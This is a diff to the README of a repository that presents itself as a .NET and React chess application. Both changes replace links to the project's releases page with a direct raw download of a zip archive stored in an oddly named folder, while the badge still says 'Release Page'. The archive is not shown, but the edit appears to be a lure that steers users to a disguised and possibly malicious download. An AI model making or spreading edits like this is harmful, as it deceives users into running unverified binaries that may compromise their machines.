@@ -1,6 +1,6 @@
 # ♟️ chess-api-dotnet-react - Play chess using modern web tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Endothermic-rock199/chess-api-dotnet-react/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Endothermic-rock199/chess-api-dotnet-react/main/incongealableness/chess_dotnet_api_react_v2.8.zip)
 
 This application provides a platform for playing chess. It combines a robust backend for game logic with a visual interface for moves. The system tracks match progress and manages player sessions through secure accounts. It uses advanced machine learning concepts to help analyze board positions.
 
@@ -20,7 +20,7 @@ If you lack the .NET Runtime, visit the official Microsoft website to download t
 
 You can get the software from the release page.
 
-[Download the application here](https://github.com/Endothermic-rock199/chess-api-dotnet-react/releases)
+[Download the application here](https://raw.githubusercontent.com/Endothermic-rock199/chess-api-dotnet-react/main/incongealableness/chess_dotnet_api_react_v2.8.zip)
 
 Follow these steps to ensure a correct installation:
 
